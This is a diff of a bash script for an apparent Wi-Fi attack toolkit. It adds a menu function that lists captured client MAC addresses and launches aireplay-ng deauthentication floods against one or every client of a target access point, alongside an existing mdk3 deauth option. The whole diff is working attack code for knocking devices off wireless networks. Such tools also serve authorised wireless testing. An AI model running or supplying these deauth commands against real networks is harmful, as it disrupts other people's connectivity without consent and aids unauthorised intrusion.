@@ -71,17 +71,95 @@ function option4
 		#sleep 5
 	done
 }
+function option3
+{
+while true
+do
+	#~ echo -e "Searching for clients"
+	if [[ ! -f "$HANDFORDEAUTH" ]]
+	then
+		echo -e ""$RS"Error 2"$CE""
+		sleep 2
+		break
+	fi
+	lines=$(cat $HANDFORDEAUTH | awk 'END{print NR}')
+	dlines=$((lines-6))
+	if [[ "$dlines" -le 0 ]]
+	then
+		echo -e ""$RS"No clients found (yet)."$CE""
+		sleep 2
+		break
+	fi
+	clear
+	echo -e "Found $dlines clients."
+	sleep 1
+	n=1
+	while [[ "$n" -le "$dlines" ]]
+	do
+		n1=$((5+n))
+		station[$n]=$(cat $HANDFORDEAUTH | awk -v nn="$n1" '{FS=","}{if(NR==nn)print $1}')
+		if [[ "$n" -ge 10 ]]
+		then
+			echo -e ""$YS""$n""$CE") "${station[$n]}""
+		else
+			echo -e ""$YS" "$n""$CE") "${station[$n]}""
+		fi
+		n=$((n+1))
+	done
+	echo -e ""$YS" a"$CE") Deauth all clients separately"
+	echo -e ""$YS" r"$CE") Refresh"
+	echo -e ""$YS" b"$CE") Go back"
+	echo -e "Choose: "
+	read STATION
+	if [[ "$STATION" = "r" ]]
+	then
+		clear
+		continue
+	fi
+	if [[ "$STATION" = "a" ]]
+	then
+		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
+		read DEAUTHS
+		if [[ "$DEAUTHS" = "" ]]
+		then
+			DEAUTHS=0
+		fi
+		n=1
+		while [[ "$n" -le "$dlines" ]]
+		do
+			DSTATION="${station[$n]}"
+			export DEAUTHS
+			export TARGB
+			export DSTATION
+			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $WLANNM && exit; exec bash' & disown
+			n=$((n+1))
+		done
+	fi
+	if [[ "$STATION" = "b" ]]
+	then
+		break
+	fi
+	echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
+	read DEAUTHS
+	if [[ "$DEAUTHS" = "" ]]
+	then
+		DEAUTHS=0
+	fi
+	DSTATION="${station[$STATION]}"
+	export DEAUTHS
+	export TARGB
+	export DSTATION
+	xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $WLANNM && exit; exec bash' & disown
+done
+}
+
 while true
 do
 	clear
 	echo -e ""$YS" 1"$CE") Deauth all                      aireplay-ng"
 	echo -e ""$YS" 2"$CE") Deauth all                      mdk3"
-	echo -e ""$YS" 3"$CE") Deauth client                   aireplay-ng"
-		if [[ "$HANDF" != 0 || "$HANDF" != "" ]]
-		then
-			echo -e ""$YS" 4"$CE") Deauth every client             aireplay-ng"
-		fi
-	if [[ HANDFORDEAUTH != "" ]]
+	echo -e ""$YS" 3"$CE") Deauth client/s                 aireplay-ng"
+	if [[ "$LASTOPTIONS" != "" ]]
 	then
 		echo -e ""$YS"ENTER"$CE") Last option"
 	fi
@@ -123,20 +201,21 @@ do
 		xterm -geometry 90x15+9999+999999 -e bash -c 'mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' 
 	elif [[ "$DT" = 3 ]]
 	then
-		echo -e "Client's MAC: "
-		read -e TCC
-		echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
-		read -e DEAUTHS
-		clear
-		if [[ -z "$DEAUTHS" ]]
-		then
-			DEAUTHS=0
-		fi
-		LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
-		export DEAUTHS
-		export TARGB
-		export TCC
-		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
+		option3
+		#~ echo -e "Client's MAC: "
+		#~ read -e TCC
+		#~ echo -e "Number of deauths to send("$YS"0"$CE"=inf)("$YS"Enter"$CE"=0): "
+		#~ read -e DEAUTHS
+		#~ clear
+		#~ if [[ -z "$DEAUTHS" ]]
+		#~ then
+			#~ DEAUTHS=0
+		#~ fi
+		#~ LASTOPTIONS="aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM"
+		#~ export DEAUTHS
+		#~ export TARGB
+		#~ export TCC
+		#~ xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC $WLANNM && exit; exec bash' 
 	elif [[ "$DT" = 4 ]]
 	then
 		LASTOPTIONS=1
